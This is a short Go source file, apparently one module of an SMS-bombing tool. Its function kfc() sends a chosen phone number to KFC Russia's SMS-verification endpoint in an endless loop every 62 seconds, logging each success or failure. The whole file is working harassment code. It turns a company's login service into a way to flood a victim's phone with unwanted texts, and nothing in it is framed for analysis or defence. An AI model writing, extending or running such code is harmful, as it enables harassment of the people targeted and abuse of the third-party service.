package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func kfc() {
	req := newreq()
	req.SetBodyString(`{"phone":"+` + num + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `success":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
